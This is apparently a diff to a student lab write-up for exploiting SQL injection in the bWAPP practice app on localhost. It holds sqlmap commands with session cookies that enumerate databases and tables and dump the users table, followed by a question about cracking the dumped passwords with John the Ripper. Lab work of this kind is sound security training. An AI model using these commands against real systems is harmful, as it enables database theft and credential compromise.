@@ -135,7 +135,6 @@ cookies value: e0cihvhout750mn5fh0tfoevl4
 
 
 **Question 1**: Use sqlmap to get information about all available databases
-**Answer 1**:
 
 go to HTML Injection - Reflected (GET)
 
@@ -155,7 +154,7 @@ use this command to get the result:
 
 `python sqlmap.py -u "http://localhost/sqli_2.php?movie=3" --cookie="PHPSESSID=rai86trmqhl5ee4g2h6halric5;security_level=0" --dbs`
 
-run command:
+**Answer 1**:
 
 ![image](https://github.com/user-attachments/assets/828c7767-4cf4-43db-8dbc-21aec306c03a)
 
@@ -167,11 +166,31 @@ result:
 
 use this command:
 
-`python3 sqlmap.py -u "http://localhost/sqli_2.php?movie=3" --cookie="PHPSESSID=rai86trmqhl5ee4g2h6halric5;security_level=0" -D dvwa --tables`
+get tables
+
+`python3 sqlmap.py -u "http://localhost/sqli_2.php?movie=3" --cookie="PHPSESSID=rai86trmqhl5ee4g2h6halric5;security_level=0"  --tables`
+
+get user informations
+
+`python3 sqlmap.py -u "http://localhost/sqli_2.php?movie=3" --cookie="PHPSESSID=rai86trmqhl5ee4g2h6halric5;security_level=0"  -D bWAPP - T users --dump`
 
 **Answer 2**:
 
+Tables:
+
+![image](https://github.com/user-attachments/assets/f917c10d-1177-4764-8ffe-43110e191332)
+
+![image](https://github.com/user-attachments/assets/e2a9877f-ed3a-40d5-9801-70da3b3b6647)
+
+![image](https://github.com/user-attachments/assets/e3b0d3ab-66bc-4fe6-b9d7-84135fb788b0)
+
+Users information:
+
+![image](https://github.com/user-attachments/assets/0a6ee294-5f2f-487f-b6fb-4a40ef2853b7)
+
+
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
+
 **Answer 3**:
 
 
